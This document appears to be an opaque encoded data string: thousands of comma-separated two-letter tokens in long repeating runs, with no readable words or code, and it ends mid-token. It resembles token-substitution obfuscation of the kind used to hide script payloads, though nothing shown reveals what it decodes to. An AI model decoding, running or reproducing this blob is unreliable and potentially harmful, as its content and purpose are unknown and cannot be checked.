v,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,NW,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,NW,Mb,ff,RV,xv,NW,xv,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,F